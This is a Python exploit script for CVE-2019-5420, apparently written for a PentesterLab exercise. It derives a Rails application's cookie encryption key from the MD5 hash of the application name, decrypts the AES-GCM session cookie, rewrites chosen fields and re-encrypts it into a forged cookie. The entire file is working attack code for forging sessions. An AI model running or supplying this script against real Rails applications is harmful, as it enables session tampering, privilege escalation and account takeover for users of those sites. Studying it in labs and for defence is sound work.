#!/usr/bin/env python3
from urllib.parse import unquote, quote
from hashlib import md5, pbkdf2_hmac
import binascii, base64, json
import argparse
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def decrypt_cookie(base64_data, appname):
    appname += "::Application"
    # secrets.secret_key_base || Digest::MD5.hexdigest(self.class.name)
    md5hash_appname = md5(appname.encode()).hexdigest()

    # OpenSSL::PKCS5.pbkdf2_hmac_sha1(@secret, salt, @iterations, key_size)
    generator = pbkdf2_hmac('sha1', md5hash_appname.encode(), "authenticated encrypted cookie".encode(), 1000, 32)
    token = binascii.hexlify(generator).decode()

    # encrypted_data, iv, auth_tag = encrypted_message.split("--".freeze).map { |v| ::Base64.strict_decode64(v) }
    parts = base64_data.split("--")
    encrypted_data = base64.b64decode(parts[0])
    iv = base64.b64decode(parts[1])
    auth_tag = base64.b64decode(parts[2])
    
    print(f"Encrypted data (hex): {binascii.hexlify(encrypted_data).decode()}")
    print(f"IV (hex): {binascii.hexlify(iv).decode()}")
    print(f"Auth tag (hex): {binascii.hexlify(auth_tag).decode()}")

    # using aes-256-gcm
    # decrypted_data = cipher.update(encrypted_data)
    data_and_tag = encrypted_data + auth_tag
    aesgcm = AESGCM(generator)
    plaintext = json.loads(aesgcm.decrypt(iv, data_and_tag, None))
    return plaintext, iv, generator

def encrypt_cookie(plaintext, iv, generator):
    aesgcm = AESGCM(generator)
    ciphertext_with_tag = aesgcm.encrypt(iv, json.dumps(plaintext).encode(), None)

    ciphertext = ciphertext_with_tag[:-16]
    auth_tag = ciphertext_with_tag[-16:]
    
    b64_data = base64.b64encode(ciphertext).decode()
    b64_iv = base64.b64encode(iv).decode()
    b64_tag = base64.b64encode(auth_tag).decode()
    
    cookie = f"{b64_data}--{b64_iv}--{b64_tag}"
    encoded_cookie = quote(cookie)
    return encoded_cookie

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='CVE-2019-5420')
    parser.add_argument('--appname', required=True, help='Application name (e.g., PentesterLab)')
    parser.add_argument('--cookie', required=True, help='Encrypted cookie data')
    parser.add_argument('--modify', nargs=2, action='append', metavar=('KEY', 'VALUE'), 
                       help='Key-value pairs to modify (can be specified multiple times)')
    
    args = parser.parse_args()
    
    # URL decode the cookie if needed
    if '%' in args.cookie:
        cookie_data = unquote(args.cookie)
    else:
        cookie_data = args.cookie
    
    # Decrypt the cookie
    plaintext, iv, generator = decrypt_cookie(cookie_data, args.appname)
    print(f"Decrypted cookie: {plaintext}")
    
    # Modify values if requested
    if args.modify:
        for key, value in args.modify:
            try:
                # Try to convert value to appropriate type
                if value.lower() == 'true':
                    value = True
                elif value.lower() == 'false':
                    value = False
                elif value.isdigit():
                    value = int(value)
                elif value.replace('.', '', 1).isdigit():
                    value = float(value)
                
                plaintext[key] = value
            except Exception as e:
                print(f"Error modifying {key}: {e}")
        
        print(f"Modified cookie: {plaintext}")
    
    # Encrypt the cookie
    new_cookie = encrypt_cookie(plaintext, iv, generator)
    print(f"New cookie: {new_cookie}")